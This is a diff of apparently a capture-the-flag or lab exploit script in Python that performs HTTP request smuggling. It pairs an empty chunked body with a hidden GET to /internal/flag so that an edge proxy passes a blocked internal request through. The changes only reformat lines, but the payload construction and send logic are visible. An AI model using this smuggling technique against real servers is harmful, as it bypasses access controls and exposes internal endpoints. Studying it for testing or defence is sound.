@@ -38,11 +38,7 @@ def build_payload():
     Content-Length is computed to cover EXACTLY the chunked terminator plus the
     smuggled request, so the edge reads it all as one request's body.
     """
-    smuggled = (
-        b"GET /internal/flag HTTP/1.1\r\n"
-        b"Host: internal\r\n"
-        b"\r\n"
-    )
+    smuggled = b"GET /internal/flag HTTP/1.1\r\n" b"Host: internal\r\n" b"\r\n"
     # Empty chunked body ("0\r\n\r\n") immediately followed by the smuggled
     # request. This whole blob is the edge-visible body of POST /submit.
     edge_body = b"0\r\n\r\n" + smuggled
@@ -83,10 +79,11 @@ def main():
     port = u.port or (443 if u.scheme == "https" else 80)
 
     # Sanity: the direct route is blocked at the edge (this is what we bypass).
-    direct = send(host, port,
-                  b"GET /internal/flag HTTP/1.1\r\nHost: edge\r\n\r\n")
-    print("[*] direct GET /internal/flag ->",
-          direct.split(b"\r\n", 1)[0].decode("latin-1", "replace"))
+    direct = send(host, port, b"GET /internal/flag HTTP/1.1\r\nHost: edge\r\n\r\n")
+    print(
+        "[*] direct GET /internal/flag ->",
+        direct.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
+    )
 
     payload = build_payload()
     print("[*] sending framing-gap payload (edge sees one request, app sees two)")
